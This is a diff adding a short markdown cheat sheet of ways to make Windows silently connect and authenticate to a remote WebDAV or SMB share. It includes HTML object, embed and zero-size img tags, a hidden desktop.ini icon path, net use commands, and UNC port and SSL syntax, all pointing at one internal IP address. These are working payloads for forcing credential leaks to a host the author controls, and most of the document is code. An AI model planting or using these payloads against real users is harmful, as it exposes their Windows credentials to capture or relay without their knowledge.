@@ -1,0 +1,56 @@
+# WebDAV
+
+### Special note, I've only noticed automatic authentication when using hostnames instead of IP addresses
+
+## Semi-Automatic (no code execution required)
+
+### HTML - Object tag:
+<code>html
+<object data="\\\\172.16.10.207\\share1\\blah.png" type="image/jpeg"></object>
+</code>
+
+### HTML - Embed tag w/ Quicktime:
+<code>html
+<embed height="50" src="\\\\172.16.10.207\\share1\\test.m3u" type="video/quicktime" width="200" controller="true" autoplay="true" kioskmode="true">
+</code>
+### HTLM - Image tag:
+<code>html
+<img src="file:////172.16.10.207/share1/blah.png" width=0 height=0>
+</code>
+
+### desktop.ini hidden file with the following contents:
+<code>batch
+[.ShellClassInfo]
+IconResource=\\\\172.16.10.207\\share1\\blah.ico
+[ViewState]
+FolderType=Generic
+</code>
+
+### Shell:
+
+<code>
+net use \\\\172.16.10.207\\share1
+</code>
+
+## GUI:
+
+Start->Run \\\\172.16.10.207\\share1
+
+Open IE or explorer to http://172.16.20.207/DavWWWRoot/share1/
+
+**DavWWWRoot** is a special Shell designation that tells the OS to automatically use WebDAV instead of SMB.
+
+## Special Notes
+Windows Vista/7/2008 support PORT and SSL settings:
+<code>
+\\\\172.16.10.207@SSL@443\\DavWWWRoot\\share1\\
+</code>
+or
+<code>
+\\\\172.16.10.207@443\\DavWWWRoot\\share1\\
+</code>
+Windows XP supports port designations using a colon
+<code>
+\\\\172.16.10.207:80\\share1\\
+</code>
+
